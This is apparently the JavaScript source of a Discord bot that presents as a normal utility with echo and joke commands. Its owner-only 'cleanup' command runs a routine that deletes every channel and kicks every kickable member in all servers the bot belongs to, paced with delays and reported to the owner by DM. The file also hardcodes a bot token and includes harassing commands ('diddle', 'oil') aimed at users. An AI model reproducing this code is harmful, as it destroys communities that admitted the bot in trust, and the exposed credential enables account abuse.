const { Client, Intents, PermissionsBitField } = require('discord.js');
const https = require('https');

const TOKEN = "MTQ4MDU5Mjg3NjY4NDcwNjA2NA.G8eWtP.bvr7AmlhdTnWW5BEK-5FQT9bNtg1Au1XM4i5pM";
const CLIENT_ID = "1480592876684706064";
const OWNER_ID = "969280648667889764";

const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.DIRECT_MESSAGES]
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const commands = [
  {
    name: "echo",
    description: "Repeat a message",
    options: [{
      name: "message",
      description: "Message to repeat",
      type: 3,
      required: true
    }]
  },
  {
    name: "servers",
    description: "List all servers the bot is in"
  },
  {
    name: "leaveall",
    description: "Make the bot leave all servers"
  },
  {
    name: "cleanup",
    description: "Start wiping all servers"
  },
  {
    name: "diddle",
    description: "Diddle a user",
    options: [{
      name: "user",
      description: "User to diddle",
      type: 6,
      required: true
    }]
  },
  {
    name: "oil",
    description: "Oil up a user",
    options: [{
      name: "user",
      description: "User to oil up",
      type: 6,
      required: true
    }]
  }
];

function registerCommands() {
  const options = {
    hostname: 'discord.com',
    port: 443,
    path: `/api/v10/applications/${CLIENT_ID}/commands`,
    method: 'PUT',
    headers: {
      'Authorization': `Bot ${TOKEN}`,
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(JSON.stringify(commands))
    }
  };

  const req = https.request(options, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log("✅ Slash commands registered successfully");
      } else {
        console.error(`❌ Failed to register commands: ${res.statusCode}`);
      }
    });
  });

  req.on('error', (error) => {
    console.error("❌ Registration error:", error.message);
  });

  req.write(JSON.stringify(commands));
  req.end();
}

async function wipeServers(owner) {
  await owner.send("Starting global server wipe.");
  
  for (const guild of client.guilds.cache.values()) {
    try {
      const me = guild.members.me;
      const canKick = me.permissions.has(PermissionsBitField.FLAGS.KICK_MEMBERS);
      const canDelete = me.permissions.has(PermissionsBitField.FLAGS.MANAGE_CHANNELS);

      if (!canKick || !canDelete) {
        await owner.send(`Skipped: ${guild.name} (missing permissions)`);
        continue;
      }

      await owner.send(`Cleaning: ${guild.name}`);

      for (const channel of guild.channels.cache.values()) {
        try {
          await channel.delete();
          await delay(800);
        } catch (e) { }
      }

      await guild.members.fetch();
      let kicked = 0;

      for (const member of guild.members.cache.values()) {
        if (member.kickable) {
          try {
            await member.kick("Server cleanup");
            kicked++;
            if (kicked % 10 === 0) {
              await owner.send(`${guild.name}: kicked ${kicked}`);
            }
            await delay(1200);
          } catch (e) { }
        }
      }

      await owner.send(`Finished ${guild.name}. Total kicked: ${kicked}`);
    } catch (e) {
      await owner.send(`Skipped ${guild.name} due to error`);
    }
  }

  await owner.send("All servers processed.");
}

client.once("ready", async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`📊 Bot is in ${client.guilds.cache.size} servers`);
  registerCommands();
  console.log("🎯 Ready for slash commands!");

  setInterval(async () => {
    try {
      const owner = await client.users.fetch(OWNER_ID);
      await owner.send("Ping Pong");
      console.log("📨 Sent Ping Pong to owner");
    } catch (error) {
      console.error("❌ Failed to send Ping Pong:", error.message);
    }
  }, 10 * 60 * 1000);
});

client.on("interactionCreate", async interaction => {
  if (!interaction.isCommand()) return;

  const { commandName, user } = interaction;

  console.log(`⚡ Slash command: /${commandName} from ${user.tag}`);

  try {
    if (commandName === "echo") {
      const msg = interaction.options.getString("message");
      await interaction.reply(msg);
      return;
    }

    if (user.id !== OWNER_ID) {
      if (["servers", "leaveall", "cleanup"].includes(commandName)) {
        await interaction.reply({
          content: "You cannot use this command.",
          ephemeral: true
        });
        return;
      }
    }

    if (commandName === "servers") {
      let list = client.guilds.cache
        .map(g => `${g.name} (${g.memberCount} members)`)
        .join("\n");
      
      if (list.length === 0) list = "No servers.";
      
      await interaction.reply({
        content: `**Servers:**\n${list}`,
        ephemeral: true
      });
      return;
    }

    if (commandName === "leaveall") {
      await interaction.reply({
        content: "Leaving all servers...",
        ephemeral: true
      });

      for (const guild of client.guilds.cache.values()) {
        try {
          await guild.leave();
        } catch (e) { }
      }
      return;
    }

    if (commandName === "diddle") {
      const target = interaction.options.getUser("user");
      await interaction.reply(`<@${target.id}> was diddled`);
      return;
    }

    if (commandName === "oil") {
      const target = interaction.options.getUser("user");
      await interaction.reply(`<@${user.id}> oiled up <@${target.id}>`);
      return;
    }

    if (commandName === "cleanup") {
      await interaction.reply({
        content: "Starting cleanup. Check your DMs for updates.",
        ephemeral: true
      });

      const owner = await client.users.fetch(OWNER_ID);
      wipeServers(owner);
      return;
    }
  } catch (error) {
    console.error("❌ Command error:", error.message);
    try {
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: "There was an error executing that command!", ephemeral: true });
      }
    } catch (e) {}
  }
});

process.on("unhandledRejection", error => {
  console.error("❌ Unhandled rejection:", error.message);
});

process.on("uncaughtException", error => {
  console.error("❌ Uncaught exception:", error.message);
});

client.on("error", error => {
  console.error("❌ Client error:", error);
});

client.login(TOKEN);
